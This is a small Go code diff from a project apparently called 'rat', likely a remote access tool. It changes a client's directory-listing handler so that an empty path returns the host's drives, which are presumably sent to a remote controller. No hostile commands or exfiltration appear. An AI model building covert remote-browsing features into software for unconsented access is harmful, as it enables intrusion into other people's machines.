@@ -3,6 +3,8 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
+	"os"
+	"rat/client/drives"
 	"rat/common"
 )
 
@@ -15,7 +17,15 @@ func (packet DirectoryPacket) GetHeader() common.PacketHeader {
 }
 
 func (packet DirectoryPacket) Write(c *Connection) error {
-	files, err := ioutil.ReadDir(packet.Path)
+	var files []os.FileInfo
+	var err error
+
+	if packet.Path == "" {
+		drives.QueryDrives()
+		files = drives.Drives
+	} else {
+		files, err = ioutil.ReadDir(packet.Path)
+	}
 
 	if err != nil {
 		fmt.Println(err.Error())
